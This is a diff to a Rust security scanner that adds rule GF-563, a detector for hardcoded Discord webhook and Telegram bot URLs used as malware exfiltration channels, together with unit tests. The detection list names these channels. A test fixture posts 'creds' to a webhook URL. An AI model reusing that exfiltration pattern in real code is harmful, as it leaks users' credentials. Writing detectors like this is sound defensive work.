@@ -5380,6 +5380,43 @@ fn scan_credential_store_access(
     }
 }
 
+/// GF-563: a hardcoded Discord webhook or Telegram bot API endpoint — the dominant
+/// exfiltration/C2 channels for infostealer and dropper malware. Legitimate apps
+/// configure webhooks at runtime, not as a literal URL in library source.
+fn scan_exfiltration_channel(
+    root: &Path,
+    path: &Path,
+    source: &str,
+    language: &str,
+    findings: &mut Vec<StaticFinding>,
+) {
+    const CHANNELS: &[&str] = &[
+        "discord.com/api/webhooks/",
+        "discordapp.com/api/webhooks/",
+        "api.telegram.org/bot",
+    ];
+    for (index, line) in source.lines().enumerate() {
+        let lower = line.to_ascii_lowercase();
+        if let Some(channel) = CHANNELS.iter().find(|c| lower.contains(**c)) {
+            let column = lower.find(*channel).map(|c| c + 1).unwrap_or(1);
+            push_pattern(
+                findings,
+                root,
+                path,
+                index,
+                column,
+                "GF-563",
+                language,
+                "exfiltration-channel",
+                "Hardcoded malware exfiltration channel",
+                "supply-chain",
+                "Source hardcodes a Discord webhook or Telegram bot endpoint — the dominant exfiltration/C2 channel for infostealer malware.",
+                line.trim(),
+            );
+        }
+    }
+}
+
 /// Dispatch supply-chain install-hook detectors by filename (raw source).
 fn scan_supply_chain_install_hooks(
     root: &Path,
@@ -9067,6 +9104,7 @@ fn push_broad_except(
 fn scan_python(root: &Path, path: &Path, source: &str, findings: &mut Vec<StaticFinding>) {
     scan_obfuscated_dynamic_exec(root, path, source, "python", findings);
     scan_credential_store_access(root, path, source, "python", findings);
+    scan_exfiltration_channel(root, path, source, "python", findings);
     push_python_broad_except_findings(root, path, source, findings);
     push_python_cors_settings_finding(root, path, source, findings);
     push_python_weak_password_hasher_findings(root, path, source, findings);
@@ -12444,6 +12482,7 @@ enum JavascriptXpathModule {
 fn scan_javascript(root: &Path, path: &Path, source: &str, findings: &mut Vec<StaticFinding>) {
     scan_obfuscated_dynamic_exec(root, path, source, "javascript", findings);
     scan_credential_store_access(root, path, source, "javascript", findings);
+    scan_exfiltration_channel(root, path, source, "javascript", findings);
     let child_process = javascript_child_process_imports(source);
     let vm = javascript_vm_imports(source);
     let template_engines = javascript_template_engine_imports(source);
@@ -33293,6 +33332,35 @@ mod tests {
             supply_chain_hook_rules("/t/other.json", fetch_exec),
             Vec::<String>::new()
         );
+    }
+
+    #[test]
+    fn gf563_flags_exfiltration_channel() {
+        let js = |src: &str| -> usize {
+            let mut f = Vec::new();
+            scan_javascript(Path::new("/t"), Path::new("/t/a.js"), src, &mut f);
+            f.into_iter().filter(|x| x.rule_id == "GF-563").count()
+        };
+        assert_eq!(
+            js("fetch('https://discord.com/api/webhooks/123/abc', {method:'POST'})"),
+            1
+        );
+        assert_eq!(
+            js("const u = 'https://api.telegram.org/bot123:ABC/sendMessage';"),
+            1
+        );
+        assert_eq!(js("fetch('https://api.example.com/collect')"), 0);
+
+        let py = |src: &str| -> usize {
+            let mut f = Vec::new();
+            scan_python(Path::new("/t"), Path::new("/t/a.py"), src, &mut f);
+            f.into_iter().filter(|x| x.rule_id == "GF-563").count()
+        };
+        assert_eq!(
+            py("requests.post('https://discordapp.com/api/webhooks/1/x', data=creds)"),
+            1
+        );
+        assert_eq!(py("r = requests.get('https://api.github.com/user')"), 0);
     }
 
     #[test]
